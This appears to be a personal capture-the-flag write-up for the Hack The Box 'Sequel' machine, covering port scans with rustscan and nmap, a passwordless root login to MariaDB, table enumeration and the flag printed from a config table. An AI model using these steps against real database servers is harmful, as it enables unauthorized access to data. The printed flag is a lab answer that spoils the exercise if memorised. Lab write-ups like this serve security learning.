
# #HTB 


![[Pasted image 20260508103123.png|267]]

# HTB: Sequel

**Machine IP:** `10.129.49.116`  
**Difficulty:** Very Easy  
**OS:** Linux 

---

## Tools Used
- `rustscan` - Fast port discovery
- `nmap` - Service version detection
- `mysql` - MariaDB/MySQL command-line client

---

## Step 1: Reconnaissance - Port Scanning

### RustScan Results

```
rustscan -a 10.129.49.116
```

**Open port discovered:**
- Port 3306 (MySQL/MariaDB)

![[Pasted image 20251228192412.png]]


### Nmap Detailed Scan

```
sudo nmap 10.129.49.116 -sV -sC -p 3306
```

![[Pasted image 20251228192442.png]]





## Step 2: Database Access - No Authentication

### Connecting to MySQL

The MariaDB server allows connections without a password:
```
mysql -h 10.129.49.116 -u root
```

![[Pasted image 20251228192559.png]]
- **Successful connection!**




## Step 3: Database Enumeration

### List Databases
```
MariaDB [(none)]> show databases;
```

![[Pasted image 20251228192958.png]]


### Select htb Database

```
MariaDB [(none)]> use htb;
Database changed
```

### List htb Database

```
MariaDB [htb]> show tables;
```

![[Pasted image 20251228193222.png]]







## Step 4: Flag Extraction

### Query config Table

```
MariaDB [htb]> select * from config;
```

![[Pasted image 20251228193320.png]]

- **Flag found in config table:** `7b4bec00d1a39e3dd4e021ec3d915da8`





## Step 5: Machine Owned

![[Pasted image 20251228193330.png]]


---
## Flags

|Flag|Value|
|---|---|
|Flag|`7b4bec00d1a39e3dd4e021ec3d915da8`|

---
## Credentials Table

|User|Password|Access Level|
|---|---|---|
|root|(blank)|Full database access|

---
